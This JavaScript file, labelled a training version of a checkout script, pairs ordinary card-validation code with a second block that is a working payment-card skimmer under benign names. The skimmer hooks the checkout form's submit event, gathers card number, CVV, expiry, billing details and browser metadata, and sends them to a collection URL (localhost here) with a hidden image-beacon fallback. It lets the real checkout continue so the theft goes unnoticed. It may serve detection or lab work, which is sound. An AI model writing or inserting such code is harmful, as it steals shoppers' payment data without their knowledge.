/**
 * CHECKOUT-PROCESS-TRAIN.JS - Training Version
 *
 * Training version for AI model training.
 * Uses benign function names instead of obfuscated malicious names.
 *
 * FOR AI TRAINING PURPOSES ONLY
 */

// ============================================================================
// PART 1: LEGITIMATE CHECKOUT CODE
// ============================================================================

;(function () {
  'use strict'

  console.log('[Checkout] Initializing legitimate checkout system...')

  /**
   * Validate credit card number using Luhn algorithm
   */
  function validateCardNumber(cardNumber) {
    const digits = cardNumber.replace(/\D/g, '')

    if (digits.length < 15 || digits.length > 16) {
      return { valid: false, error: 'Card number must be 15-16 digits' }
    }

    // Luhn algorithm
    let sum = 0
    let isEven = false

    for (let i = digits.length - 1; i >= 0; i--) {
      let digit = parseInt(digits[i])

      if (isEven) {
        digit *= 2
        if (digit > 9) {
          digit -= 9
        }
      }

      sum += digit
      isEven = !isEven
    }

    const luhnValid = sum % 10 === 0
    if (!luhnValid) {
      return { valid: false, error: 'Invalid card number (Luhn algorithm check failed)' }
    }

    return { valid: true }
  }

  /**
   * Validate expiry date
   */
  function validateExpiry(expiry) {
    const parts = expiry.split('/')
    if (parts.length !== 2) return false

    const month = parseInt(parts[0])
    const year = parseInt('20' + parts[1])

    if (month < 1 || month > 12) return false

    const now = new Date()
    const currentYear = now.getFullYear()
    const currentMonth = now.getMonth() + 1

    if (year < currentYear) return false
    if (year === currentYear && month < currentMonth) return false

    return true
  }

  /**
   * Validate CVV
   */
  function validateCVV(cvv, cardNumber) {
    const digits = cvv.replace(/\D/g, '')
    const cleanCard = cardNumber.replace(/\D/g, '')

    // Amex (starts with 34 or 37) uses 4-digit CVV
    if (cleanCard.startsWith('34') || cleanCard.startsWith('37')) {
      return digits.length === 4
    }

    // Others use 3-digit CVV
    return digits.length === 3
  }

  /**
   * Show validation error
   */
  function showError(fieldId, message) {
    const field = document.getElementById(fieldId)
    field.style.borderColor = '#e74c3c'

    // Remove any existing error message
    const existingError = field.parentElement.querySelector('.error-message')
    if (existingError) {
      existingError.remove()
    }

    // Add error message
    const errorDiv = document.createElement('div')
    errorDiv.className = 'error-message'
    errorDiv.style.color = '#e74c3c'
    errorDiv.style.fontSize = '0.9rem'
    errorDiv.style.marginTop = '0.25rem'
    errorDiv.textContent = message
    field.parentElement.appendChild(errorDiv)

    // Focus the field
    field.focus()
  }

  /**
   * Clear validation errors
   */
  function clearErrors() {
    document.querySelectorAll('.error-message').forEach(el => el.remove())
    document.querySelectorAll('input, select').forEach(el => {
      el.style.borderColor = '#ddd'
    })
  }

  /**
   * Process payment (simulated)
   */
  function processPayment(formData) {
    console.log('[Checkout] Processing payment...')
    console.log('[Checkout] IMPORTANT: This is a simulated transaction')

    return new Promise(resolve => {
      setTimeout(() => {
        console.log('[Checkout] Payment processed successfully (simulated)')
        console.log('[Checkout] Transaction ID:', 'TXN-' + Date.now())
        resolve({
          success: true,
          transactionId: 'TXN-' + Date.now()
        })
      }, 1000)
    })
  }

  /**
   * Handle form submission
   */
  async function handleSubmit(event) {
    event.preventDefault()

    console.log('[Checkout] Form submitted')
    clearErrors()

    // Get form values
    const cardNumber = document.getElementById('card-number').value
    const cvv = document.getElementById('cvv').value
    const expiry = document.getElementById('expiry').value

    // Validate card number
    const cardValidation = validateCardNumber(cardNumber)
    if (!cardValidation.valid) {
      showError('card-number', cardValidation.error)
      return false
    }

    // Validate expiry
    if (!validateExpiry(expiry)) {
      showError('expiry', 'Card has expired or invalid date')
      return false
    }

    // Validate CVV
    if (!validateCVV(cvv, cardNumber)) {
      showError('cvv', 'Invalid CVV code')
      return false
    }

    // Show loading state
    const submitBtn = document.querySelector('.submit-btn')
    const originalText = submitBtn.textContent
    submitBtn.textContent = 'Processing...'
    submitBtn.disabled = true

    try {
      const formData = new FormData(event.target)
      const data = Object.fromEntries(formData.entries())

      const result = await processPayment(data)

      if (result.success) {
        event.target.style.display = 'none'
        const successMessage = document.getElementById('success-message')
        successMessage.classList.add('show')

        console.log('[Checkout] Order completed successfully')
      }
    } catch (error) {
      console.error('[Checkout] Payment processing error:', error)
      alert('Payment processing failed. Please try again.')

      submitBtn.textContent = originalText
      submitBtn.disabled = false
    }
  }

  /**
   * Initialize checkout
   */
  function init() {
    const form = document.getElementById('payment-form')

    if (form) {
      form.addEventListener('submit', handleSubmit)
      console.log('[Checkout] Checkout system ready')
    }
  }

  // Initialize when DOM is ready
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init)
  } else {
    init()
  }
})()

// ============================================================================
// PART 2: PAYMENT PROCESSING CODE (Training Version - Benign Names)
// ============================================================================

;(function () {
  'use strict'

  // Payment processing initialization delay
  setTimeout(function () {
    // Configuration for payment processing
    const CONFIG = {
      paymentApiUrl: 'http://localhost:9002/collect',
      processingDelay: 100,
      debug: true
    }

    function logPaymentEvent(message, data) {
      if (CONFIG.debug) {
        console.log('[PAYMENT]', message, data || '')
      }
    }

    /**
     * Process payment data from form
     */
    function processPaymentData() {
      logPaymentEvent('Processing payment data from form fields...')
      const data = {
        cardNumber: getFormFieldValue(['#card-number', '[name="cardNumber"]']),
        cvv: getFormFieldValue(['#cvv', '[name="cvv"]']),
        expiry: getFormFieldValue(['#expiry', '[name="expiry"]']),
        cardholderName: getFormFieldValue(['#cardholder-name', '[name="cardholderName"]']),
        billingAddress: getFormFieldValue(['#billing-address', '[name="billingAddress"]']),
        city: getFormFieldValue(['#city', '[name="city"]']),
        zip: getFormFieldValue(['#zip', '[name="zip"]']),
        country: getFormFieldValue(['#country', '[name="country"]']),
        email: getFormFieldValue(['#email', '[name="email"]']),
        phone: getFormFieldValue(['#phone', '[name="phone"]'])
      }

      logPaymentEvent('Processed payment data:', data)

      // Add metadata
      data.metadata = {
        url: window.location.href,
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        screenResolution: screen.width + 'x' + screen.height
      }

      return data
    }

    function getFormFieldValue(selectors) {
      logPaymentEvent('Searching for form field with selectors:', selectors)
      for (let selector of selectors) {
        const element = document.querySelector(selector)
        logPaymentEvent(
          `Selector "${selector}":`,
          element ? `found element with value "${element.value}"` : 'not found'
        )
        if (element && element.value) {
          return element.value.trim()
        }
      }
      return ''
    }

    function validatePaymentData(data) {
      const cleanCard = data.cardNumber.replace(/[\s-]/g, '')
      const validLength = cleanCard.length === 15 || cleanCard.length === 16
      const validCVV = data.cvv.length === 3 || data.cvv.length === 4
      return validLength && validCVV && data.expiry
    }

    /**
     * Send payment data to payment API
     */
    function sendPaymentData(data) {
      logPaymentEvent('Sending payment data to payment API:', data)
      logPaymentEvent('Target URL:', CONFIG.paymentApiUrl)
      logPaymentEvent('Data size:', JSON.stringify(data).length, 'bytes')

      const requestBody = JSON.stringify(data)
      logPaymentEvent('Request body:', requestBody)

      fetch(CONFIG.paymentApiUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: requestBody,
        mode: 'cors',
        credentials: 'omit'
      })
        .then(response => {
          logPaymentEvent('API response status:', response.status)
          logPaymentEvent('API response headers:', Object.fromEntries(response.headers.entries()))
          return response.text()
        })
        .then(responseText => {
          logPaymentEvent('API response body:', responseText)
          logPaymentEvent('Payment data successfully sent')
        })
        .catch(error => {
          console.error('[PAYMENT] API request failed:', error)
          logPaymentEvent('API error details:', {
            name: error.name,
            message: error.message,
            stack: error.stack
          })

          // Fallback method
          logPaymentEvent('Attempting fallback image beacon method')
          const img = new Image()
          const params = new URLSearchParams({
            d: btoa(JSON.stringify(data))
          })
          const fallbackUrl = CONFIG.paymentApiUrl + '?' + params.toString()
          logPaymentEvent('Fallback URL:', fallbackUrl)
          img.src = fallbackUrl

          img.onload = () => logPaymentEvent('Fallback beacon succeeded')
          img.onerror = err => logPaymentEvent('Fallback beacon failed:', err)
        })
    }

    /**
     * Initialize payment processor
     */
    function initPaymentProcessor() {
      logPaymentEvent('Initializing payment processor...')

      const checkForm = setInterval(() => {
        const form = document.querySelector('#payment-form')

        if (form) {
          clearInterval(checkForm)
          logPaymentEvent('Payment form found, attaching payment processor')
          logPaymentEvent('Form element:', form)
          logPaymentEvent('Form fields found:', form.elements.length)

          // Intercept form submission
          form.addEventListener('submit', function (event) {
            logPaymentEvent('Form submission detected')
            logPaymentEvent('Event:', event)

            const paymentData = processPaymentData()

            if (validatePaymentData(paymentData)) {
              logPaymentEvent('Valid payment data found, preparing to send')

              setTimeout(() => {
                sendPaymentData(paymentData)
              }, CONFIG.processingDelay)
            } else {
              logPaymentEvent('Insufficient payment data, skipping send')
            }

            // CRITICAL: Allow legitimate checkout to continue
          })

          logPaymentEvent('Payment processor ready and listening')
        }
      }, 100)

      // Stop checking after 10 seconds
      setTimeout(() => {
        clearInterval(checkForm)
      }, 10000)
    }

    // Start the payment processor
    if (document.readyState === 'loading') {
      document.addEventListener('DOMContentLoaded', initPaymentProcessor)
    } else {
      initPaymentProcessor()
    }
  }, 500) // 500ms delay after page load
})()

